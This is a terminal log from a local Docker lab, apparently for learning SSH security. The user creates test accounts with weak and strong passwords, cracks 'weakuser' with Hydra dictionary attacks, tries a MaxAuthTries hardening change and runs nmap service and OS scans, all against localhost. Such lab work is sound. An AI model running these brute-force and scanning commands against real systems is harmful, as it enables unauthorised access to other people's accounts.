┌──(kali㉿kali)-[~/Documents/project]
└─$ ssh student@localhost -p 2222
student@localhost's password: 
Welcome to OpenSSH Server
c8d0acdd6689:~$ exit
logout
Connection to localhost closed.
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker-compose up -d
[sudo] password for kali: 
WARN[0000] /home/kali/Documents/project/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 1/1
 ✔ Container ssh_lab  Running                                                                               0.0s 
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker exec -it ssh_lab bash
root@c8d0acdd6689:/# chmod +x /create_users.sh
root@c8d0acdd6689:/# ./create_users.sh
Creating users for SSH lab...
Users created:
 - weakuser / 123456
 - mediumuser / Password123
 - stronguser / Str0ng!Pass#2026
Done.
root@c8d0acdd6689:/# id weakuser
uid=1001(weakuser) gid=1001(weakuser) groups=1001(weakuser)
root@c8d0acdd6689:/# exit
exit
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker exec -it ssh_lab bash
[sudo] password for kali: 
root@c8d0acdd6689:/# bash /create_users.sh
Creating users for SSH lab...
useradd: user 'weakuser' already exists
useradd: user 'mediumuser' already exists
useradd: user 'stronguser' already exists
Users created:
 - weakuser / 123456
 - mediumuser / Password123
 - stronguser / Str0ng!Pass#2026
Done.
root@c8d0acdd6689:/# service ssh status
bash: service: command not found
root@c8d0acdd6689:/# /etc/init.d/ssh start
bash: /etc/init.d/ssh: No such file or directory
root@c8d0acdd6689:/# /usr/sbin/sshd
bash: /usr/sbin/sshd: No such file or directory
root@c8d0acdd6689:/# apt update
bash: apt: command not found
root@c8d0acdd6689:/# apt install openssh-server -y
bash: apt: command not found
root@c8d0acdd6689:/# exit
exit
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker compose down         
WARN[0000] /home/kali/Documents/project/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 2/2
 ✔ Container ssh_lab        Removed                                                                         4.6s 
 ✔ Network project_default  Removed                                                                         0.2s 
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker compose up -d --build
WARN[0000] /home/kali/Documents/project/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 2/2
 ✔ Network project_default  Created                                                                         0.1s 
 ✔ Container ssh_lab        Started                                                                         0.6s 
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ ss -tlpn | grep 2222
LISTEN 0      4096         0.0.0.0:2222       0.0.0.0:*          
LISTEN 0      4096            [::]:2222          [::]:*          
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ grep "123456" passwords.txt
123456
123456789
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo hydra -l weakuser -P passwords.txt ssh://127.0.0.1:2222 -t 1 -f -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 03:02:00
[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:1/p:20), ~20 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "123456" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "password" - 2 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "password123" - 3 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "admin" - 4 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "admin123" - 5 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "qwerty" - 6 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "letmein" - 7 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "welcome" - 8 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "student" - 9 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "student123" - 10 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "test" - 11 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "test123" - 12 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "123456789" - 13 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "iloveyou" - 14 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "changeme" - 15 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[RE-ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
[INFO] Writing restore file because 2 server scans could not be completed
[ERROR] 1 target was disabled because of too many errors
[ERROR] 1 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-27 03:02:04
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker exec -it ssh_lab bash /create_users.sh
Creating users for SSH lab...
Users created:
 - weakuser / 123456
 - mediumuser / Password123
 - stronguser / Str0ng!Pass#2026
Done.
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo hydra -l weakuser -P passwords.txt ssh://127.0.0.1:2222 -t 1 -w 2 -f -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] the waittime you set is low, this can result in errornous results
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 03:05:35
[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:1/p:20), ~20 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[ATTEMPT] target 127.0.0.1 - login "weakuser" - pass "123456" - 1 of 20 [child 0] (0/0)
[2222][ssh] host: 127.0.0.1   login: weakuser   password: 123456
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-27 03:05:35
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo hydra -l stronguser -P passwords.txt ssh://127.0.0.1:2222 -t 1 -f -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 03:09:12
[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:1/p:20), ~20 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "123456" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "password" - 2 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "password123" - 3 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "admin" - 4 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "admin123" - 5 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "qwerty" - 6 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "letmein" - 7 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "welcome" - 8 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "student" - 9 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "student123" - 10 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "test" - 11 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "test123" - 12 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "123456789" - 13 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "iloveyou" - 14 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "changeme" - 15 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "P@ssw0rd" - 16 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "SecurePass!2024" - 17 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "Str0ng#Key99" - 18 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "MySafePassword!" - 19 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "UltraSecure_2026!" - 20 of 20 [child 0] (0/0)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-27 03:09:12
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker exec -it ssh_lab bash                 
root@b07266ce98a4:/# fail2ban-client status
bash: fail2ban-client: command not found
root@b07266ce98a4:/# iptables -L
bash: iptables: command not found
root@b07266ce98a4:/# grep "MaxAuthTries" /etc/ssh/sshd_config
#MaxAuthTries 6
root@b07266ce98a4:/# sed -i 's/MaxAuthTries 6/MaxAuthTries 2/' /etc/ssh/sshd_config || echo "MaxAuthTries 2" >> /etc/ssh/sshd_config
root@b07266ce98a4:/# kill -HUP $(cat /var/run/sshd.pid)
cat: /var/run/sshd.pid: No such file or directory
kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
root@b07266ce98a4:/# killall sshd
killall: sshd: no process killed
root@b07266ce98a4:/# pkill sshd
root@b07266ce98a4:/# /usr/sbin/sshd
bash: /usr/sbin/sshd: No such file or directory
root@b07266ce98a4:/# which sshd
root@b07266ce98a4:/# which sshd
root@b07266ce98a4:/# /usr/local/sbin/sshd
bash: /usr/local/sbin/sshd: No such file or directory
root@b07266ce98a4:/# /sbin/sshd
bash: /sbin/sshd: No such file or directory
root@b07266ce98a4:/# exit
exit
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker restart ssh_lab                       
ssh_lab
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo docker exec -it ssh_lab bash
root@b07266ce98a4:/# grep "MaxAuthTries" /etc/ssh/sshd_config
#MaxAuthTries 2
root@b07266ce98a4:/# sudo hydra -l stronguser -P passwords.txt ssh://127.0.0.1:2222 -t 16 -V
sudo: hydra: command not found
root@b07266ce98a4:/# exit
exit
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo hydra -l stronguser -P passwords.txt ssh://127.0.0.1:2222 -t 16 -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 03:20:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "123456" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "password" - 2 of 20 [child 1] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "password123" - 3 of 20 [child 2] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "admin" - 4 of 20 [child 3] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "admin123" - 5 of 20 [child 4] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "qwerty" - 6 of 20 [child 5] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "letmein" - 7 of 20 [child 6] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "welcome" - 8 of 20 [child 7] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "student" - 9 of 20 [child 8] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "student123" - 10 of 20 [child 9] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "test" - 11 of 20 [child 10] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "test123" - 12 of 20 [child 11] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "123456789" - 13 of 20 [child 12] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "iloveyou" - 14 of 20 [child 13] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "changeme" - 15 of 20 [child 14] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "P@ssw0rd" - 16 of 20 [child 15] (0/0)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "SecurePass!2024" - 17 of 22 [child 1] (0/2)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "Str0ng#Key99" - 18 of 22 [child 0] (0/2)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "MySafePassword!" - 19 of 22 [child 1] (0/2)
[ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "UltraSecure_2026!" - 20 of 22 [child 3] (0/2)
[REDO-ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "student123" - 21 of 22 [child 4] (1/2)
[REDO-ATTEMPT] target 127.0.0.1 - login "stronguser" - pass "123456789" - 22 of 22 [child 5] (2/2)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-27 03:20:30
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ nmap -sS -sV -O -p- 127.0.0.1:2222
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 05:13 EDT
Failed to resolve "127.0.0.1:2222".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.23 seconds
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ nmap -p 2222 127.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 05:15 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo nmap -sV -p 2222 127.0.0.1
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 05:15 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000091s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ sudo nmap -A -p 2222 127.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 05:16 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000070s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X|6.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
OS details: Linux 5.0 - 6.2
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
                                                                                                                             
┌──(kali㉿kali)-[~/Documents/project]
└─$ 
